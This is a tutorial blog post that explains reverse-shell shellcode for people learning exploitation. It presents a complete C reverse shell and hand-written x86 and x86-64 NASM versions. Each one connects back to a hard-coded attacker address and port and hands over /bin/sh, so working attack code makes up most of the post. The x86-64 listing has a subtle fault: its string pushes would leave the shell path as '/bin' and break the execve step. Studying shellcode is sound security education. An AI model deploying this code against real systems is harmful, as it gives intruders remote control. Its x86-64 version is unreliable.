---
layout: post
title: "Understanding Shellcode: The Reverse Shell"
category: Security
date: 2018-10-30
series: "Understanding Shellcode"
tags:
  - Shellcode
  - Security
---
A recent conversation with a coworker inspired me to start putting
together a series of blog posts to examine what it is that shellcode does.  In
the first installment, I'll dissect the basic reverse shell.

First, a couple of reminders: shellcode is the machine code that is injected
into the flow of a program as the result of an exploit.  It generally must be
position independent as you can't usually control where it will be loaded in
memory.  A reverse shell initiates a TCP connection from the compromised host
back to a host under the control of the attacker.  It then launches a shell with
which the attacker can interact.

<!--more-->

## Reverse Shell in C ##

Let's examine a basic reverse shell in C.  Error handling is elided, both for
the space in this post, and because most shellcode is not going to have error
handling.

``` c
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

void reverse_shell() {
  /* Allocate a socket for IPv4/TCP (1) */
  int sock = socket(AF_INET, SOCK_STREAM, 0);

  /* Setup the connection structure. (2) */
  struct sockaddr_in sin;
  sin.sin_family = AF_INET;
  sin.sin_port = htons(4444);

  /* Parse the IP address (3) */
  inet_pton(AF_INET, "192.168.22.33", &sin.sin_addr.s_addr);

  /* Connect to the remote host (4) */
  connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr_in));

  /* Duplicate the socket to STDIO (5) */
  dup2(sock, STDIN_FILENO);
  dup2(sock, STDOUT_FILENO);
  dup2(sock, STDERR_FILENO);

  /* Setup and execute a shell. (6) */
  char *argv[] = {"/bin/sh", NULL};
  execve("/bin/sh", argv, NULL);
}
```

## Reverse Shell Steps ##

As can be seen, there are approximately 6 steps in setting up a reverse shell.
Once they are understood, this can be converted to proper shellcode.

1. First we need to allocate a socket structure in the kernel with a call to
   `socket`.  This is a wrapper for a system call (since it has effects in
   kernel space).  On x86, this wraps a system call called
   [`socketcall`](http://man7.org/linux/man-pages/man2/socketcall.2.html), which
   is a single entry point for dispatching all socket-related system calls.  On
   x86-64, the different socket system calls are actually distinct system calls,
   so this will call the `socket` system call.  It needs to know the address
   family (`AF_INET` for IPv4) and the socket type (`SOCK_STREAM` for TCP, it
   would be `SOCK_DGRAM` for UDP).  This returns an integer that is a file
   descriptor for the socket.
2. Next, we need to setup a `struct sockaddr_in`, which includes the family
   (`AF_INET` again), and the port number in network byte order (big-endian).
3. We also need to put the IP address into the structure.  `inet_pton` can parse
   a string form into the struct.  In a `struct sockaddr_in`, this is a 4 byte
   value, again in network byte order.
4. We now have the full structure setup, so we can initiate a connection to the
   remote host using the already-created socket.  This is done with a call to
   `connect`.  Like `socket`, this is a wrapper for the `socketcall` system
   call on x86, and for a `connect` system call on x86-64.
5. We want the shell to use our socket when it is handling standard input/output
   (`stdio`) functions.  To do this, we duplicate the file descriptor from the
   socket to each of `STDIN`, `STDOUT`, `STDERR`.  Like so many, `dup2()` is a
   thin wrapper around a system call.
6. Finally, we setup the arguments for our shell, and launch it with `execve`,
   yet another system call.  This one will replace the current binary image with
   the targeted binary (`/bin/sh`) and then execute it from the entry point.  It
   will execute with its standard input, output, and error connected to the
   network socket.

## Why not shellcode in C? ##

So, if we have a working function, why can't we just use that as shellcode?
Well, even if we compile position independent code (`-pie -fPIE` in gcc), this
code will still have many library calls in it.  In a normal program, this is no
problem, as it will be linked with the C library and run fine.  However, this
relies on the loader doing the right thing, including the placement of the [PLT
and GOT](/2017/03/19/got-and-plt-for-pwning.html).  When we inject shellcode, we
only inject the machine code, and don't include any data areas necessary for the
location of the GOT.

What about statically linking the C library to avoid all these problems?  While
that has the potential to work, any constants (like the strings for the IP
address and the shell path) will be located in a different section of the
binary, and so the code will be unable to reference those.  (Unless we inject
that section as well and fixup the relative addresses, but in that case, the
complexity of our loader approaches the complexity of our entire shellcode.)

## Reverse Shell in x86 ##

My shellcode below will be written with the intent of being as clear as possible
as a learning instrument.  Consequently, it is neither the shortest possible
shellcode, nor is it free of "bad characters" (null bytes, newlines, etc.).  It
is also written as NASM assembly.

``` nasm
; Do the steps to setup a socket (1)
; SYS_socket = 1
mov ebx, 1
; Setup the arguments to socket() on the stack.
push 0  ; Flags = 0
push 1  ; SOCK_STREAM = 1
push 2  ; AF_INET = 2
; Move a pointer to these values to ecx for socketcall.
mov ecx, esp
; We're calling SYS_SOCKETCALL
mov eax, 0x66
; Get the socket
int 0x80

; Time to setup the struct sockaddr_in (2), (3)
; push the address so it ends up in network byte order
; 192.168.22.33 == 0xC0A81621
push 0x2116a8c0
; push the port as a short in network-byte order
; 4444 = 0x115c
mov ebx, 0x5c11
push bx
; push the address family, AF_INET = 2
mov ebx, 0x2
push bx

; Let's establish the connection (4)
; Save address of our struct
mov ebx, esp
; Push size of the struct
push 0x10
; Push address of the struct
push ebx
; Push the socketfd
push eax
; Put the pointer into ecx
mov ecx, esp
; We're calling SYS_CONNECT = 3 (via SYS_SOCKETCALL)
mov ebx, 0x3
; Preserve sockfd
push eax
; Call SYS_SOCKETCALL
mov eax, 0x66
; Make the connection
int 0x80

; Let's duplicate the FDs from our socket. (5)
; Load the sockfd
pop ebx
; STDERR
mov ecx, 2
; Calling SYS_DUP2 = 0x3f
mov eax, 0x3f
; Syscall!
int 0x80
; mov to STDOUT
dec ecx
; Reload eax
mov eax, 0x3f
; Syscall!
int 0x80
; mov to STDIN
dec ecx
; Reload eax
mov eax, 0x3f
; Syscall!
int 0x80

; Now time to execve (6)
; push "/bin/sh\0" on the stack
push 0x68732f
push 0x6e69622f
; preserve filename
mov ebx, esp
; array of arguments
xor eax, eax
push eax
push ebx
; pointer to array in ecx
mov ecx, esp
; null envp
xor edx, edx
; call SYS_execve = 0xb
mov eax, 0xb
; execute the shell!
int 0x80
```

## Reverse Shell in x86-64 ##

This will be very similar to the x86 shellcode, but adjusted for x86-64.  I will
use the proper x86-64 system calls and 64-bit registers where possible.

``` nasm
; Do the steps to setup a socket (1)
; Setup the arguments to socket() in appropriate registers
xor rdx, rdx  ; Flags = 0
mov rsi, 1    ; SOCK_STREAM = 1
mov rdi, 2    ; AF_INET = 2
; We're calling SYS_socket
mov rax, 41
; Get the socket
syscall

; Time to setup the struct sockaddr_in (2), (3)
; push the address so it ends up in network byte order
; 192.168.22.33 == 0xC0A81621
push 0x2116a8c0
; push the port as a short in network-byte order
; 4444 = 0x115c
mov bx, 0x5c11
push bx
; push the address family, AF_INET = 2
mov bx, 0x2
push bx

; Let's establish the connection (4)
; Save address of our struct
mov rsi, rsp
; size of the struct
mov rdx, 0x10
; Our socket fd
mov rdi, rax
; Preserve sockfd
push rax
; Call SYS_connect
mov rax, 42
; Make the connection
syscall

; Let's duplicate the FDs from our socket. (5)
; Load the sockfd
pop rdi
; STDERR
mov rsi, 2
; Calling SYS_dup2 = 0x21
mov rax, 0x21
; Syscall!
syscall
; mov to STDOUT
dec rsi
; Reload rdi
mov rax, 0x21
; Syscall!
syscall
; mov to STDIN
dec rsi
; Reload rdi
mov rax, 0x21
; Syscall!
syscall

; Now time to execve (6)
; push "/bin/sh\0" on the stack
push 0x68732f
push 0x6e69622f
; preserve filename
mov rdi, rsp
; array of arguments
xor rdx, rdx
push rdx
push rdi
; pointer to array in rsi
mov rsi, rsp
; call SYS_execve = 59
mov rax, 59
; execute the shell!
syscall
```
